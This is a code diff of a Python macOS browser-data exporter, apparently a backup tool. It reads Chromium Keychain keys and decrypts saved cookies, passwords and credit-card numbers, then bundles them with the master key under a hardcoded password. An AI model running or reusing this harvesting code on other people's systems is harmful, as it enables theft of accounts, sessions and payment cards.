@@ -295,10 +295,11 @@ class BrowserDataExporter:
     
     def __init__(self, output_dir=None):
         home = os.path.expanduser('~')
-        # 浏览器 User Data 根目录（支持多个 Profile）
+        # Chromium User Data 根目录（支持多个 Profile）。Safari 使用独立的数据格式，
+        # 不能按 Chromium SQLite 数据库读取，因此不在此导出器中伪装支持。
         self.browsers = {
             "Chrome": os.path.join(home, "Library", "Application Support", "Google", "Chrome"),
-            "Safari": os.path.join(home, "Library", "Safari"),  # Safari 不使用 Profile
+            "Edge": os.path.join(home, "Library", "Application Support", "Microsoft Edge"),
             "Brave": os.path.join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser"),
         }
         if output_dir is None:
@@ -309,6 +310,35 @@ class BrowserDataExporter:
         else:
             self.output_dir = Path(output_dir)
         self.output_dir.mkdir(parents=True, exist_ok=True)
+
+    def get_available_profiles(self, user_data_dir):
+        """返回存在的 Chromium Profile，Default 始终排在最前。"""
+        profiles = []
+        if not os.path.exists(user_data_dir):
+            return profiles
+
+        try:
+            for item in os.listdir(user_data_dir):
+                item_path = os.path.join(user_data_dir, item)
+                if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
+                    profiles.append((item, item_path))
+        except OSError as e:
+            logging.debug(f"扫描 Profile 失败: {e}")
+
+        return sorted(profiles, key=lambda profile: (profile[0] != "Default", profile[0]))
+
+    @staticmethod
+    def build_browser_payload(profiles, master_key):
+        """构建与独立导入器兼容的浏览器载荷。"""
+        return {
+            "profiles": profiles,
+            "master_key": base64.b64encode(master_key).decode("utf-8"),
+            "total_cookies": sum(len(profile.get("cookies", [])) for profile in profiles.values()),
+            "total_passwords": sum(len(profile.get("passwords", [])) for profile in profiles.values()),
+            "total_autofill": sum(len(profile.get("autofill", [])) for profile in profiles.values()),
+            "total_credit_cards": sum(len(profile.get("credit_cards", [])) for profile in profiles.values()),
+            "profiles_count": len(profiles),
+        }
     
     def get_master_key(self, browser_name):
         """获取浏览器主密钥（从 macOS Keychain）"""
@@ -316,51 +346,31 @@ class BrowserDataExporter:
             return None
             
         try:
-            # Safari 不使用主密钥加密（使用系统 Keychain 直接存储）
-            if browser_name == "Safari":
-                return None  # Safari 使用不同的机制
-            
-            # Chrome/Brave 的密钥存储在 Keychain 中
+            # 各 Chromium 浏览器的密钥存储在不同的 Keychain 项中。
             keychain_names = {
-                "Chrome": "Chrome Safe Storage",
-                "Brave": "Brave Safe Storage",
+                "Chrome": [("Chrome Safe Storage", "Chrome"), ("Chrome Safe Storage", "")],
+                "Edge": [("Microsoft Edge Safe Storage", "Microsoft Edge"), ("Microsoft Edge Safe Storage", "Edge")],
+                "Brave": [("Brave Safe Storage", "Brave"), ("Brave Safe Storage", "")],
             }
-            
-            service_name = keychain_names.get(browser_name, "Chrome Safe Storage")
-            
-            # 使用 security 命令从 Keychain 获取密钥
-            cmd = [
-                'security',
-                'find-generic-password',
-                '-w',  # 只输出密码
-                '-s', service_name,  # service name
-                '-a', browser_name  # account name
-            ]
-            
-            result = subprocess.run(cmd, capture_output=True, text=True)
-            if result.returncode == 0:
-                password = result.stdout.strip()
-                # Chrome/Edge/Brave 使用 "peanuts" 作为密码的情况（某些版本）
-                if not password:
-                    password = "peanuts"
-                
-                # 使用 PBKDF2 派生密钥
-                key = PBKDF2(
-                    password.encode('utf-8'),
-                    BackupConfig.PBKDF2_SALT,
-                    dkLen=16,
-                    count=BackupConfig.PBKDF2_ITERATIONS
-                )
-                return key
-            else:
-                # 如果 Keychain 中没有，使用默认密码
-                key = PBKDF2(
-                    BackupConfig.CHROME_DEFAULT_PASSWORD.encode('utf-8'),
-                    BackupConfig.PBKDF2_SALT,
-                    dkLen=16,
-                    count=BackupConfig.PBKDF2_ITERATIONS
-                )
-                return key
+            for service_name, account_name in keychain_names.get(browser_name, []):
+                cmd = ['security', 'find-generic-password', '-w', '-s', service_name]
+                if account_name:
+                    cmd.extend(['-a', account_name])
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
+                if result.returncode == 0 and result.stdout.strip():
+                    return PBKDF2(
+                        result.stdout.strip().encode('utf-8'),
+                        BackupConfig.PBKDF2_SALT,
+                        dkLen=16,
+                        count=BackupConfig.PBKDF2_ITERATIONS,
+                    )
+
+            return PBKDF2(
+                BackupConfig.CHROME_DEFAULT_PASSWORD.encode('utf-8'),
+                BackupConfig.PBKDF2_SALT,
+                dkLen=16,
+                count=BackupConfig.PBKDF2_ITERATIONS,
+            )
         except (subprocess.SubprocessError, OSError, ValueError) as e:
             logging.error(f"❌ 获取 {browser_name} 主密钥失败: {e}")
             return None
@@ -408,6 +418,9 @@ class BrowserDataExporter:
     
     def safe_copy_locked_file(self, source_path, dest_path, max_retries=3):
         """安全复制被锁定的文件（浏览器运行时）"""
+        # SQLite 在线备份优先，避免复制正在写入的数据库快照。
+        if self.sqlite_online_backup(source_path, dest_path):
+            return True
         for attempt in range(max_retries):
             try:
                 shutil.copy2(source_path, dest_path)
@@ -632,182 +645,54 @@ class BrowserDataExporter:
         return passwords
     
     def export_web_data(self, browser_name, browser_path, master_key, profile_name=None):
-        """导出 Web Data（自动填充数据、支付方式等）"""
+        """导出可被独立导入器恢复的自动填充和信用卡记录。"""
         web_data_path = os.path.join(browser_path, "Web Data")
         if not os.path.exists(web_data_path):
-            return {
-                "autofill_profiles": [],
-                "credit_cards": [],
-                "autofill_profile_names": [],
-                "autofill_profile_emails": [],
-                "autofill_profile_phones": [],
-                "autofill_profile_addresses": []
-            }
-        
-        # 使用安全复制方法
+            return [], []
+
         profile_suffix = f"_{profile_name}" if profile_name else ""
-        temp_web_data = os.path.join(self.output_dir, f"temp_{browser_name}{profile_suffix}_webdata.db")
+        temp_web_data = os.path.join(self.output_dir, f"temp_{browser_name}{profile_suffix}_web_data.db")
         if not self.safe_copy_locked_file(web_data_path, temp_web_data):
-            return {
-                "autofill_profiles": [],
-                "credit_cards": [],
-                "autofill_profile_names": [],
-                "autofill_profile_emails": [],
-                "autofill_profile_phones": [],
-                "autofill_profile_addresses": []
-            }
-        
-        web_data = {
-            "autofill_profiles": [],
-            "credit_cards": [],
-            "autofill_profile_names": [],
-            "autofill_profile_emails": [],
-            "autofill_profile_phones": [],
-            "autofill_profile_addresses": []
-        }
-        
+            return [], []
+
+        autofill, credit_cards = [], []
         try:
             conn = sqlite3.connect(temp_web_data)
             cursor = conn.cursor()
-            
-            try:
-                # 使用 CAST 确保 card_number_encrypted 作为 BLOB 读取
-                cursor.execute("SELECT guid, name_on_card, expiration_month, expiration_year, CAST(card_number_encrypted AS BLOB) as card_number_encrypted, billing_address_id, nickname FROM credit_cards")
-                for row in cursor.fetchall():
-                    guid, name_on_card, exp_month, exp_year, encrypted_card, billing_id, nickname = row
-                    try:
-                        # 确保 encrypted_card 是 bytes 类型
-                        if encrypted_card is not None:
-                            if isinstance(encrypted_card, str):
-                                try:
-                                    encrypted_card = encrypted_card.encode('latin1')
-                                except:
-                                    continue
-                            elif not isinstance(encrypted_card, (bytes, bytearray)):
-                                try:
-                                    encrypted_card = bytes(encrypted_card)
-                                except:
-                                    continue
-                        
-                        decrypted_card = self.decrypt_payload(encrypted_card, master_key) if encrypted_card else None
-                        if decrypted_card:
-                            web_data["credit_cards"].append({
-                                "guid": guid,
-                                "name_on_card": name_on_card,
-                                "expiration_month": exp_month,
-                                "expiration_year": exp_year,
-                                "card_number": decrypted_card,
-                                "billing_address_id": billing_id,
-                                "nickname": nickname
-                            })
-                    except Exception:
-                        continue
-            except (sqlite3.Error, UnicodeDecodeError) as e:
-                logging.debug(f"导出信用卡数据失败: {e}")
-                # 尝试备用方法
-                try:
-                    conn2 = sqlite3.connect(temp_web_data)
-                    conn2.text_factory = bytes
-                    cursor2 = conn2.cursor()
-                    cursor2.execute("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards")
-                    for row in cursor2.fetchall():
-                        guid_bytes, name_bytes, exp_month, exp_year, encrypted_card, billing_id, nickname_bytes = row
-                        try:
-                            guid = guid_bytes.decode('utf-8') if isinstance(guid_bytes, bytes) else guid_bytes
-                            name_on_card = name_bytes.decode('utf-8') if isinstance(name_bytes, bytes) else name_bytes
-                            nickname = nickname_bytes.decode('utf-8') if isinstance(nickname_bytes, bytes) else nickname_bytes
-                            
-                            if encrypted_card is not None and isinstance(encrypted_card, bytes):
-                                decrypted_card = self.decrypt_payload(encrypted_card, master_key)
-                                if decrypted_card:
-                                    web_data["credit_cards"].append({
-                                        "guid": guid,
-                                        "name_on_card": name_on_card,
-                                        "expiration_month": exp_month,
-                                        "expiration_year": exp_year,
-                                        "card_number": decrypted_card,
-                                        "billing_address_id": billing_id,
-                                        "nickname": nickname
-                                    })
-                        except Exception:
-                            continue
-                    conn2.close()
-                except Exception:
-                    pass
-            except Exception:
-                pass
-            
-            try:
-                cursor.execute("SELECT guid, first_name, middle_name, last_name, full_name, honorific_prefix, honorific_suffix FROM autofill_profiles")
-                for row in cursor.fetchall():
-                    guid, first_name, middle_name, last_name, full_name, honorific_prefix, honorific_suffix = row
-                    web_data["autofill_profiles"].append({
-                        "guid": guid,
-                        "first_name": first_name,
-                        "middle_name": middle_name,
-                        "last_name": last_name,
-                        "full_name": full_name,
-                        "honorific_prefix": honorific_prefix,
-                        "honorific_suffix": honorific_suffix
-                    })
-            except Exception:
-                pass
-            
-            try:
-                cursor.execute("SELECT guid, first_name, middle_name, last_name, full_name FROM autofill_profile_names")
-                for row in cursor.fetchall():
-                    guid, first_name, middle_name, last_name, full_name = row
-                    web_data["autofill_profile_names"].append({
-                        "guid": guid,
-                        "first_name": first_name,
-                        "middle_name": middle_name,
-                        "last_name": last_name,
-                        "full_name": full_name
-                    })
-            except Exception:
-                pass
-            
-            try:
-                cursor.execute("SELECT guid, email FROM autofill_profile_emails")
-                for row in cursor.fetchall():
-                    guid, email = row
-                    web_data["autofill_profile_emails"].append({
-                        "guid": guid,
-                        "email": email
-                    })
-            except Exception:
-                pass
-            
-            try:
-                cursor.execute("SELECT guid, number FROM autofill_profile_phones")
-                for row in cursor.fetchall():
-                    guid, number = row
-                    web_data["autofill_profile_phones"].append({
-                        "guid": guid,
-                        "number": number
-                    })
-            except Exception:
-                pass
-            
-            try:
-                cursor.execute("SELECT guid, street_address, address_line_1, address_line_2, city, state, zipcode, country_code FROM autofill_profile_addresses")
-                for row in cursor.fetchall():
-                    guid, street_address, address_line_1, address_line_2, city, state, zipcode, country_code = row
-                    web_data["autofill_profile_addresses"].append({
-                        "guid": guid,
-                        "street_address": street_address,
-                        "address_line_1": address_line_1,
-                        "address_line_2": address_line_2,
-                        "city": city,
-                        "state": state,
-                        "zipcode": zipcode,
-                        "country_code": country_code
-                    })
-            except Exception:
-                pass
-            
+
+            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='autofill'")
+            if cursor.fetchone():
+                cursor.execute("PRAGMA table_info(autofill)")
+                columns = {row[1] for row in cursor.fetchall()}
+                fields = [field for field in ("name", "value", "date_created", "date_last_used", "count") if field in columns]
+                if "name" in columns and "value" in columns:
+                    cursor.execute(f"SELECT {','.join(fields)} FROM autofill")
+                    autofill = [dict(zip(fields, row)) for row in cursor.fetchall()]
+
+            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='credit_cards'")
+            if cursor.fetchone():
+                cursor.execute("PRAGMA table_info(credit_cards)")
+                columns = {row[1] for row in cursor.fetchall()}
+                fields = [field for field in (
+                    "guid", "name_on_card", "expiration_month", "expiration_year",
+                    "card_number_encrypted", "date_modified", "use_count", "use_date",
+                    "billing_address_id", "nickname", "card_issuer", "instrument_id",
+                    "virtual_card_enrollment_state", "card_art_url", "product_description",
+                ) if field in columns]
+                if "card_number_encrypted" in columns:
+                    cursor.execute(f"SELECT {','.join(fields)} FROM credit_cards")
+                    for row in cursor.fetchall():
+                        card = dict(zip(fields, row))
+                        encrypted_number = card.pop("card_number_encrypted", None)
+                        if isinstance(encrypted_number, str):
+                            encrypted_number = encrypted_number.encode("latin1")
+                        number = self.decrypt_payload(encrypted_number, master_key)
+                        if number:
+                            card["number"] = number
+                            credit_cards.append(card)
+
             conn.close()
-        except (sqlite3.Error, OSError) as e:
+        except (sqlite3.Error, OSError, UnicodeDecodeError) as e:
             logging.debug(f"导出 Web Data 失败: {e}")
         finally:
             if os.path.exists(temp_web_data):
@@ -816,7 +701,7 @@ class BrowserDataExporter:
                 except Exception:
                     pass
         
-        return web_data
+        return autofill, credit_cards
     
     def encrypt_export_data(self, data, password):
         """加密导出数据"""
@@ -868,41 +753,7 @@ class BrowserDataExporter:
                 logging.info(f"⏭️  跳过 {browser_name}（未安装）")
                 continue
             
-            # Safari 特殊处理（不使用 Profile）
-            if browser_name == "Safari":
-                logging.info(f"\n📦 处理 {browser_name}...")
-                # Safari 不使用主密钥加密
-                master_key = None
-                master_key_b64 = None
-                cookies = self.export_cookies(browser_name, user_data_path, master_key, None)
-                passwords = self.export_passwords(browser_name, user_data_path, master_key, None)
-                web_data = self.export_web_data(browser_name, user_data_path, master_key, None)
-                
-                if cookies or passwords or any(web_data.values()):
-                    total_web_data_items = (
-                        len(web_data["autofill_profiles"]) +
-                        len(web_data["credit_cards"]) +
-                        len(web_data["autofill_profile_names"]) +
-                        len(web_data["autofill_profile_emails"]) +
-                        len(web_data["autofill_profile_phones"]) +
-                        len(web_data["autofill_profile_addresses"])
-                    )
-                    all_data["browsers"][browser_name] = {
-                        "cookies": cookies,
-                        "passwords": passwords,
-                        "web_data": web_data,
-                        "cookies_count": len(cookies),
-                        "passwords_count": len(passwords),
-                        "web_data_count": total_web_data_items,
-                        "credit_cards_count": len(web_data["credit_cards"]),
-                        "autofill_profiles_count": len(web_data["autofill_profiles"]),
-                        "master_key": master_key_b64  # Safari 不使用 Master Key
-                    }
-                    web_data_info = f", {total_web_data_items} Web Data" if total_web_data_items > 0 else ""
-                    logging.info(f"✅ {browser_name}: {len(cookies)} Cookies, {len(passwords)} 密码{web_data_info}")
-                continue
-            
-            # Chrome 和 Brave 支持多个 Profile
+            # 所有支持的浏览器均按 Chromium Profile 处理。
             logging.info(f"\n📦 处理 {browser_name}...")
             
             # 获取主密钥（所有 Profile 共享同一个 Master Key）
@@ -913,25 +764,9 @@ class BrowserDataExporter:
                 master_key_b64 = base64.b64encode(master_key).decode('utf-8')
             else:
                 logging.warning(f"⚠️  无法获取 {browser_name} 主密钥，将跳过加密数据解密")
-            
-            # 扫描所有可能的 Profile 目录（Default, Profile 1, Profile 2, ...）
-            profiles = []
-            try:
-                for item in os.listdir(user_data_path):
-                    item_path = os.path.join(user_data_path, item)
-                    # 检查是否是 Profile 目录（Default 或 Profile N）
-                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
-                        # 检查是否存在 Cookies、Login Data 或 Web Data 文件（支持 Network/Cookies 路径）
-                        cookies_path = os.path.join(item_path, "Network", "Cookies")
-                        if not os.path.exists(cookies_path):
-                            cookies_path = os.path.join(item_path, "Cookies")
-                        login_data_path = os.path.join(item_path, "Login Data")
-                        web_data_path = os.path.join(item_path, "Web Data")
-                        if os.path.exists(cookies_path) or os.path.exists(login_data_path) or os.path.exists(web_data_path):
-                            profiles.append(item)
-            except Exception as e:
-                logging.error(f"❌ 扫描 {browser_name} Profile 目录失败: {e}")
                 continue
+            
+            profiles = self.get_available_profiles(user_data_path)
             
             if not profiles:
                 logging.warning(f"⚠️  {browser_name} 未找到任何 Profile")
@@ -939,54 +774,44 @@ class BrowserDataExporter:
             
             # 为每个 Profile 导出数据
             browser_profiles = {}
-            for profile_name in profiles:
-                profile_path = os.path.join(user_data_path, profile_name)
+            for profile_name, profile_path in profiles:
                 logging.info(f"  📂 处理 Profile: {profile_name}")
                 
                 cookies = self.export_cookies(browser_name, profile_path, master_key, profile_name) if master_key else []
                 passwords = self.export_passwords(browser_name, profile_path, master_key, profile_name) if master_key else []
-                web_data = self.export_web_data(browser_name, profile_path, master_key, profile_name)
+                autofill, credit_cards = self.export_web_data(browser_name, profile_path, master_key, profile_name)
                 
-                if cookies or passwords or any(web_data.values()):
+                if cookies or passwords or autofill or credit_cards:
                     total_web_data_items = (
-                        len(web_data["autofill_profiles"]) +
-                        len(web_data["credit_cards"]) +
-                        len(web_data["autofill_profile_names"]) +
-                        len(web_data["autofill_profile_emails"]) +
-                        len(web_data["autofill_profile_phones"]) +
-                        len(web_data["autofill_profile_addresses"])
+                        len(autofill) + len(credit_cards)
                     )
                     browser_profiles[profile_name] = {
                         "cookies": cookies,
                         "passwords": passwords,
-                        "web_data": web_data,
+                        "autofill": autofill,
+                        "credit_cards": credit_cards,
                         "cookies_count": len(cookies),
                         "passwords_count": len(passwords),
                         "web_data_count": total_web_data_items,
-                        "credit_cards_count": len(web_data["credit_cards"]),
-                        "autofill_profiles_count": len(web_data["autofill_profiles"])
+                        "credit_cards_count": len(credit_cards),
+                        "autofill_count": len(autofill)
                     }
                     web_data_info = f", {total_web_data_items} Web Data" if total_web_data_items > 0 else ""
                     logging.info(f"    ✅ {profile_name}: {len(cookies)} Cookies, {len(passwords)} 密码{web_data_info}")
             
             if browser_profiles:
-                all_data["browsers"][browser_name] = {
-                    "profiles": browser_profiles,
-                    "master_key": master_key_b64,  # 备份 Master Key（base64 编码，所有 Profile 共享）
-                    "total_cookies": sum(p["cookies_count"] for p in browser_profiles.values()),
-                    "total_passwords": sum(p["passwords_count"] for p in browser_profiles.values()),
-                    "total_web_data": sum(p.get("web_data_count", 0) for p in browser_profiles.values()),
-                    "total_credit_cards": sum(p.get("credit_cards_count", 0) for p in browser_profiles.values()),
-                    "total_autofill_profiles": sum(p.get("autofill_profiles_count", 0) for p in browser_profiles.values()),
-                    "profiles_count": len(browser_profiles)
-                }
+                all_data["browsers"][browser_name] = self.build_browser_payload(browser_profiles, master_key)
                 master_key_status = "✅" if master_key_b64 else "⚠️"
                 total_cookies = all_data["browsers"][browser_name]["total_cookies"]
                 total_passwords = all_data["browsers"][browser_name]["total_passwords"]
-                total_web_data = all_data["browsers"][browser_name]["total_web_data"]
+                total_web_data = all_data["browsers"][browser_name]["total_autofill"] + all_data["browsers"][browser_name]["total_credit_cards"]
                 web_data_summary = f", {total_web_data} Web Data" if total_web_data > 0 else ""
                 logging.info(f"✅ {browser_name}: {len(browser_profiles)} 个 Profile, {total_cookies} Cookies, {total_passwords} 密码{web_data_summary} {master_key_status} Master Key")
         
+        if not all_data["browsers"]:
+            logging.warning("⚠️ 没有可导出的浏览器数据")
+            return None
+
         # 加密保存
         logging.info("\n" + "-"*60)
         password = "cookies2026"
